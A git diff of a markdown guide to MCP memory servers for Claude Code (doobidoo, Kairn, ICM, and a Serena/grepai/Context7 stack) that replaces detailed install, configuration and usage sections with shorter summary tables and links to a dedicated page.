+| Storage | SQLite-vec (default), Cloudflare D1+Vectorize, hybrid |
+| Tools | 12 MCP tools (store, retrieve, tag search, graph ops, health check) |
+| Multi-client | 13+ apps share `~/.mcp-memory-service/memories.db` |
+| Install | `pip install mcp-memory-service` |
+| Cross-device | Cloudflare backend required |
 
-| Feature | Serena | doobidoo |
-|---------|--------|----------|
-| Memory storage | Key-value | Semantic embeddings |
-| Search by meaning | No | Yes |
-| Multi-client | Claude only | 13+ apps |
-| Dashboard | No | Knowledge Graph |
-| Symbol indexation | Yes | No |
+**Known issues**: `busy_timeout=5000ms` default causes intermittent errors under concurrent access; fix with `MCP_MEMORY_SQLITE_PRAGMAS=busy_timeout=15000,cache_size=20000`.
 
-**Storage Backends**:
+> **Full coverage**: See [Memory Systems: doobidoo](./core/memory-systems.md#35-doobidoo-mcp-memory-service) for installation, configuration, storage backends, known issues, and comparison with Kairn/ICM.
 
-| Backend | Usage | Performance |
-|---------|-------|-------------|
-| `sqlite_vec` (default) | Local, lightweight | <10ms queries |
-| `cloudflare` | Cloud, multi-device sync | Edge performance |
-| `hybrid` | Local fast + cloud background sync | 5ms local |
-
-**Data Location**: `~/.mcp-memory-service/memories.db` (SQLite with vector embeddings)
-
-**MCP Tools Available** (12 unified tools):
-
-| Tool | Description |
-|------|-------------|
-| `store_memory` | Store with tags, type, metadata |
-| `retrieve_memory` | Semantic search (top-N by similarity) |
-| `search_by_tag` | Exact tag matching (OR/AND logic) |
-| `delete_memory` | Delete by content_hash |
-| `list_memories` | Paginated browsing with filters |
-| `check_database_health` | Stats, backend status, sync info |
-| `get_cache_stats` | Server performance metrics |
-| `memory_graph:connected` | Find connected memories |
-| `memory_graph:path` | Shortest path between memories |
-| `memory_graph:subgraph` | Subgraph around a memory |
-
-**Installation**:
-
-```bash
-# Quick install (local SQLite backend)
-pip install mcp-memory-service
-python -m mcp_memory_service.scripts.installation.install --quick
-
-# Team/Production install (more options)
-git clone https://github.com/doobidoo/mcp-memory-service.git
-cd mcp-memory-service
-python scripts/installation/install.py
-# → Choose: cloudflare or hybrid for multi-device sync
-```
-
-**Configuration** (add to MCP config):
-
-```json
-{
-  "mcpServers": {
-    "memory": {
-      "command": "memory",
-      "args": ["server"]
-    }
-  }
-}
-```
-
-**Configuration with environment variables** (for team/cloud sync):
-
-```json
-{
-  "mcpServers": {
-    "memory": {
-      "command": "memory",
-      "args": ["server"],
-      "env": {
-        "MCP_MEMORY_STORAGE_BACKEND": "hybrid",
-        "MCP_HTTP_ENABLED": "true",
-        "MCP_HTTP_PORT": "8000",
-        "CLOUDFLARE_API_TOKEN": "your-token",
-        "CLOUDFLARE_ACCOUNT_ID": "your-account-id"
-      }
-    }
-  }
-}
-```
-
-**Key Environment Variables**:
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `MCP_MEMORY_STORAGE_BACKEND` | `sqlite_vec` | Backend: sqlite_vec, cloudflare, hybrid |
-| `MCP_HTTP_ENABLED` | `true` | Enable dashboard server |
-| `MCP_HTTP_PORT` | `8000` | Dashboard port |
-| `MCP_OAUTH_ENABLED` | `false` | Enable OAuth for team auth |
-| `MCP_HYBRID_SYNC_INTERVAL` | `300` | Sync interval in seconds |
-
-**Usage**:
-
-```
-# Store a decision with tags
-store_memory("We decided to use FastAPI for the REST API", tags=["architecture", "api"])
-
-# Semantic search (finds by meaning, not exact match)
-retrieve_memory("what framework for API?")
-→ Returns: "We decided to use FastAPI..." with similarity score
-
-# Search by tag
-search_by_tag(["architecture"])
-
-# Check health
-check_database_health()
-```
-
-**Multi-Client Sync**:
-
-```
-# Same machine: all clients share ~/.mcp-memory-service/memories.db
-Claude Code ──┐
-Cursor ───────┼──► Same SQLite file
-VS Code ──────┘
-
-# Multi-device: use Cloudflare backend
-Device A ──┐
-Device B ──┼──► Cloudflare D1 + Vectorize
-Device C ──┘
-```
-
-**When to use which**:
-- **Serena**: Symbol navigation, code indexation, key-value memory with known keys
-- **doobidoo**: Cross-session decisions, "what did we decide about X?", multi-IDE sharing
-
-**Dashboard**: Access at http://localhost:8000 after starting the server.
-
-> **Source**: [doobidoo/mcp-memory-service GitHub](https://github.com/doobidoo/mcp-memory-service) (791 stars, v10.0.2)
+> **Source**: [doobidoo/mcp-memory-service GitHub](https://github.com/doobidoo/mcp-memory-service) (~1.6K stars, v10.0.2)
 
 ### Kairn: Knowledge Graph Memory with Biological Decay
 
-> **⚠️ Status: Under Testing** - Evaluated Feb 2026. MIT licensed, Python 100%. Feedback welcome!
+> **⚠️ Status: Under Testing** — Evaluated Feb 2026. MIT licensed, Python.
 
-**Purpose**: Long-term project memory organized as a knowledge graph with automatic decay — stale information expires on its own, preventing context pollution.
+**Purpose**: Long-term project memory as a knowledge graph with automatic biological decay — stale info expires without manual cleanup.
 
-**Key differentiators vs doobidoo/Serena**:
-- **Typed relationships**: `depends-on`, `resolves`, `causes` — captures causality, not just content
-- **Biological decay model**: solutions persist ~200 days, workarounds ~50 days — auto-pruning without `delete_memory` calls
-- **18 MCP tools**: graph ops, project tracking, experience management, intelligence layer (full-text search, confidence routing, cross-workspace patterns)
+| Feature | Value |
+|---------|-------|
+| Typed relationships | `depends-on`, `resolves`, `causes` |
+| Decay model | Solutions ~200 days, workarounds ~50 days |
+| Tools | 18 MCP tools (graph ops, search, cross-workspace patterns) |
+| Install | `pip install kairn` |
 
-| Feature | Serena | doobidoo | Kairn |
-|---------|--------|----------|-------|
-| Storage model | Key-value | Semantic embeddings | Knowledge graph |
-| Memory decay / auto-expiry | No | No | Yes (biological) |
-| Typed relationships | No | Tags only | depends-on / resolves / causes |
-| Full-text search | No | Yes | Yes |
-| Auto-pruning stale info | No | No | Yes |
+Use Kairn when causality matters ("this breaks *because* of that") or when long-running projects accumulate stale workarounds that need auto-pruning.
 
-**When Kairn makes sense**:
-- Long-running projects where workarounds from months ago become noise
-- When causality matters: "this breaks *because* of that", "this fix *resolves* that bug"
-- Teams wanting automatic knowledge hygiene without manual cleanup
+> **Full coverage**: See [Memory Systems: Kairn](./core/memory-systems.md#34-kairn) for full feature breakdown, decay model details, and comparison with doobidoo/ICM.
 
-**MCP Config**:
-
-```json
-"kairn": {
-  "command": "python",
-  "args": ["-m", "kairn", "serve"],
-  "description": "Knowledge graph memory with biological decay"
-}
-```
-
-**Install**:
-
-```bash
-pip install kairn
-# or from source:
-git clone https://github.com/kairn-ai/kairn && cd kairn && pip install -e .
-```
-
-> **Source**: [kairn-ai/kairn GitHub](https://github.com/kairn-ai/kairn) (MIT, Python 100%)
+> **Source**: [kairn-ai/kairn GitHub](https://github.com/kairn-ai/kairn) (MIT, Python)
 
 ### ICM: Dual Memory Architecture (Rust Binary, Zero Dependencies)
 
-> **⚠️ Status: Under Testing** — Evaluated March 2026. Source-Available license (free for individuals and teams ≤20). From the rtk-ai team (same authors as RTK). Benchmarks below are vendor-reported and unverified independently. Feedback welcome!
+> **⚠️ Status: Under Testing** — Evaluated March 2026. Source-Available license (free for individuals and teams ≤20). Benchmarks are vendor-reported, unverified independently.
 
-**Purpose**: Persistent memory for AI agents combining episodic decay (Memories) and permanent knowledge graph (Memoirs) in a single zero-dependency Rust binary.
+**Purpose**: Persistent memory combining episodic decay (Memories) and permanent knowledge graph (Memoirs) in a single zero-dependency Rust binary.
 
-**When ICM makes sense over Kairn/doobidoo**:
-- Python dependency management is a friction point (CI environments, sandboxed machines)
-- You want Homebrew install with no Python env setup
-- You need both decay-based episodic memory and a permanent knowledge graph in one tool
-- You use multiple editors (14 clients supported: Claude Code, Cursor, VS Code, Windsurf, Zed, Amp, Cline, Roo Code, OpenAI Codex CLI, and more)
+| Feature | Value |
+|---------|-------|
+| Install | `brew tap rtk-ai/tap && brew install icm` |
+| Modes | MCP (31 tools) / Hook (zero explicit calls) / Skills (/recall, /remember) |
+| Dual architecture | Memories (configurable decay) + Memoirs (permanent typed graph, 9 relation types) |
+| Hybrid search | BM25 30% + vector 70%, hybrid latency ~951 µs/op |
+| Auto-extraction | Three layers: pattern hooks, pre-compaction, session-start |
+| Cross-IDE | 14 clients (Claude Code, Cursor, VS Code, Windsurf, Zed, Amp, Cline, Roo Code...) |
+| License | Source-Available — free for teams ≤20, enterprise required above |
 
-**Key differentiators vs Kairn/doobidoo**:
-- **Single Rust binary**: no Python, no pip, no virtual env — `brew install icm` and done
-- **Dual architecture in one tool**: Memories (decay, episodic) + Memoirs (permanent, typed graph) — Kairn covers the graph layer, doobidoo the semantic layer, ICM covers both
-- **Auto-extraction**: three-layer automatic capture (pattern hooks, pre-compaction, session-start) without explicit `store_memory` calls
-- **Auto-deduplication**: blocks entries with >85% similarity to existing content
+**Critical setup note**: `icm init --mode hook` ships the hook file but does NOT register it in `settings.json`. Add manually:
 
-| Feature | doobidoo | Kairn | ICM |
-|---------|----------|-------|-----|
-| Language | Python | Python | Rust (single binary) |
-| Install | pip | pip | Homebrew / curl |
-| Episodic decay | No | Yes (biological) | Yes (configurable rates) |
-| Permanent knowledge graph | No | Yes | Yes (Memoirs) |
-| Auto-extraction | No | No | Yes (3 layers) |
-| Hybrid search | Semantic | Full-text + semantic | BM25 30% + vector 70% |
-| License | MIT | MIT | Source-Available |
-
-**Memoir relation types** (9): `part_of`, `depends_on`, `related_to`, `contradicts`, `refines`, `alternative_to`, `caused_by`, `instance_of`, `superseded_by`
-
-**Installation**:
-
-```bash
-# Homebrew (recommended)
-brew tap rtk-ai/tap && brew install icm
-
-# Quick install
-curl -fsSL https://raw.githubusercontent.com/rtk-ai/icm/main/install.sh | sh
-
-# From source
-cargo install --path crates/icm-cli
+```json
+{"hooks": {"PostToolUse": [{"matcher": "*", "hooks": [{"type": "command", "command": "~/.claude/hooks/icm-post-tool.sh"}]}]}}
 ```
 
-**Setup** (3 separate modes, not a single interactive command):
-
-```bash
-# Step 1: MCP server → auto-injects into ~/.claude.json (and 13 other editors)
-icm init --mode mcp
-
-# Step 2: PostToolUse hook → auto-extracts context every N tool calls
-icm init --mode hook
-
-# Step 3: /recall and /remember slash commands
-icm init --mode skill
-```
-
-Restart Claude Code after running all three.
-
-**Usage**:
-
-```bash
-# Store episodic memory (importance = critical|high|medium|low, not a float)
-icm store --topic "my-project" --content "Use PostgreSQL for main DB" --importance high
-
-# Recall with hybrid search
-icm recall "database choice"
-
-# Build permanent knowledge graph
-icm memoir create -n "system-architecture"
-icm memoir add-concept -m "system-architecture" -n "auth-service"
-icm memoir link -m "system-architecture" --from "api-gateway" --to "auth-service" -r depends-on
-
-# Session management
-icm stats      # memory count, topics, avg weight
-icm topics     # list all topics
-icm decay      # apply temporal decay manually
-icm prune      # remove low-weight entries
-```
-
-**Onboarding prompt**: a ready-to-use session starter template is available at `examples/memory/icm-session-starter.md`.
-
-**Performance** (1000 ops, 384d embeddings — vendor-reported):
-
-| Operation | Latency |
-|-----------|---------|
-| Store (no embeddings) | 34.2 µs/op |
-| Store (with embeddings) | 51.6 µs/op |
-| FTS5 full-text search | 46.6 µs/op |
-| Vector search (KNN) | 590.0 µs/op |
-| Hybrid search | 951.1 µs/op |
-
-**Agent efficiency claims** (vendor-reported, Haiku model, unverified independently):
-- Session 2: 29% fewer turns, 17% cost reduction
-- Session 3: 40% fewer turns, 22% cost reduction
-
-> ⚠️ **License note**: Free for individuals and teams of up to 20 people. Enterprise license required above that threshold. Verify your organization's size before deploying. Contact: license@rtk.ai
+> **Full coverage**: See [Memory Systems: ICM](./core/memory-systems.md#33-icm-infinite-context-memory) for full architecture breakdown, Memoir relation types, benchmarks, and comparison with Kairn/doobidoo.
 
 > **Source**: [rtk-ai/icm GitHub](https://github.com/rtk-ai/icm) (52 stars, Source-Available)
 
 ### MCP Memory Stack: Complementarity Patterns
 
-> **⚠️ Experimental** - These patterns combine multiple MCP servers. Test in your workflow before relying on them.
+The four tools serve orthogonal roles in a layered knowledge stack:
 
-**The 4-Layer Knowledge Stack**:
+| Layer | Tool | Question answered |
+|-------|------|-------------------|
+| Business context | doobidoo | "Why did we do this?" |
+| Code structure | Serena | "Where is X defined?" |
+| Code by intent | grepai | "Find code that does X" |
+| Library docs | Context7 | "How to use library X?" |
 
-```
-┌─────────────────────────────────────────────────────┐
-│                    KNOWLEDGE LAYER                   │
-├─────────────────────────────────────────────────────┤
-│  doobidoo     │ Decisions, ADRs, business context   │
-│  (semantic)   │ "Why did we do this?"               │
-├───────────────┼─────────────────────────────────────┤
-│  Serena       │ Symbols, structure, key-value memory│
-│  (code index) │ "Where is X defined?"               │
-├───────────────┼─────────────────────────────────────┤
-│  grepai       │ Semantic code search + call graph   │
-│  (code search)│ "Find code that does X"             │
-├───────────────┼─────────────────────────────────────┤
-│  Context7     │ Official library documentation      │
-│  (docs)       │ "How to use library X?"             │
-└─────────────────────────────────────────────────────┘
-```
+Combination workflows: `retrieve_memory()` for business context, `grepai search` to find code, `find_symbol()` for exact location.
 
-**Comparison Matrix**:
-
-| Capability | Serena | grepai | doobidoo | Kairn | ICM |
-|------------|--------|--------|----------|-------|-----|
-| Cross-session memory | Key-value | No | Semantic | Knowledge graph | Episodic + graph |
-| Cross-IDE memory | No | No | Yes | Yes | Yes (14 clients) |
-| Cross-device sync | No | No | Yes (Cloudflare) | No | No |
-| Knowledge Graph | No | Call graph | Decision graph | Typed relationships | Typed relationships |
-| Fuzzy search | No | Code | Memory | Full-text + semantic | BM25 + vector hybrid |
-| Tags/categories | No | No | Yes | Yes | Yes (topics) |
-| Memory decay / auto-expiry | No | No | No | Yes (biological) | Yes (configurable) |
-| Auto-extraction | No | No | No | No | Yes (3 layers) |
-| Runtime | — | — | Python | Python | Rust (single binary) |
-| License | MIT | MIT | MIT | MIT | Source-Available (≤20 free) |
-
-**Usage Patterns**:
-
-| Pattern | Tool | Example |
-|---------|------|---------|
-| **Decision taken** | doobidoo | `store_memory("Decision: FastAPI because async + OpenAPI", tags=["decision", "api"])` |
-| **Convention established** | doobidoo | `store_memory("Convention: snake_case for Python", tags=["convention"])` |
-| **Bug resolved** | doobidoo | `store_memory("Bug: token TTL mismatch Redis/JWT. Fix: align TTL+60s", tags=["bug", "auth"])` |
-| **WIP warning** | doobidoo | `store_memory("WIP: refactoring AuthService, don't touch", tags=["wip"])` |
-| **Find symbol** | Serena | `find_symbol("PaymentProcessor")` |
-| **Find callers** | grepai | `grepai trace callers "validateToken"` |
-| **Search by intent** | grepai | `grepai search "authentication logic"` |
-| **Library docs** | Context7 | `resolve-library-id("fastapi")` |
-
-**Combined Workflows**:
-
-```
-# Workflow 1: Understanding a feature
-retrieve_memory("payment module status?")        # doobidoo → business context
-grepai search "payment processing"               # grepai → find code
-find_symbol("PaymentProcessor")                  # Serena → exact location
-
-# Workflow 2: Onboarding (Session 1 → Session N)
-# Session 1 (senior dev)
-store_memory("Architecture: hexagonal with ports/adapters", tags=["onboarding"])
-store_memory("Tests in __tests__/, using Vitest", tags=["onboarding", "testing"])
-store_memory("DANGER: never touch legacy/payment.ts without review", tags=["onboarding", "danger"])
-
-# Session N (new dev)
-retrieve_memory("project architecture?")
-retrieve_memory("where are tests?")
-retrieve_memory("dangerous areas?")
-
-# Workflow 3: ADR (Architecture Decision Records)
-store_memory("""
-ADR-001: FastAPI vs Flask
-- Decision: FastAPI
-- Reason: native async, auto OpenAPI, typing
-- Rejected: Flask (sync), Django (too heavy)
-""", tags=["adr", "api"])
-
-# 3 months later
-retrieve_memory("why FastAPI?")
-
-# Workflow 4: Debug context persistence
-store_memory("Auth bug: Redis TTL expires before JWT", tags=["debug", "auth"])
-store_memory("Fix: align Redis TTL = JWT exp + 60s margin", tags=["debug", "auth", "fix"])
-
-# Same bug reappears months later
-retrieve_memory("auth token redis problem")
-→ Finds the fix immediately
-
-# Workflow 5: Multi-IDE coordination
-# In Claude Code (terminal)
-store_memory("Refactoring auth in progress, don't touch AuthService", tags=["wip"])
-
-# In Cursor (another window)
-retrieve_memory("work in progress?")
-→ Sees the warning
-```
-
-**When to use which memory system**:
-
-| Need | Tool | Why |
-|------|------|-----|
-| "I know the exact key" | Serena `read_memory("api_choice")` | Fast, direct lookup |
-| "I remember the topic, not the key" | doobidoo `retrieve_memory("API decision?")` | Semantic search |
-| "Share across IDEs" | doobidoo | Multi-client support |
-| "Share across devices" | doobidoo + Cloudflare | Cloud sync |
-| "Code symbol location" | Serena `find_symbol()` | Code indexation |
-| "Code by intent" | grepai `search()` | Semantic code search |
-| "Long-term project memory, auto-expiry" | Kairn | Biological decay model |
-| "Why did X break / what resolved Y?" | Kairn | Typed relationships (resolves, causes) |
-
-**Current Limitations** (doobidoo):
-
-| Limitation | Impact | Workaround |
-|------------|--------|------------|
-| No versioning | Can't see decision history | Include dates in content |
-| No permissions | Anyone can modify | Use separate DBs per team |
-| No source linking | No link to file/line | Include file refs in content |
-| No expiration | Stale memories persist | Manual cleanup with `delete_memory` OR use Kairn (auto-decay) |
-| No git integration | No branch-aware memory | Tag with branch name |
+> **Full coverage**: See [Memory Systems: Architecture Patterns](./core/memory-systems.md#6-architecture-patterns) and [Master Comparison Table](./core/memory-systems.md#38-master-comparison-table) for the complete 20-tool matrix, combined workflows, multi-agent patterns, and decision flowchart.
 
 ---
 
@@ -26393,4 +25728,4 @@ We'll evaluate and add it to this section if it meets quality criteria.
 
 **Contributions**: Issues and PRs welcome.
 
-**Last updated**: January 2026 | **Version**: 3.40.0
+**Last updated**: January 2026 | **Version**: 3.41.0
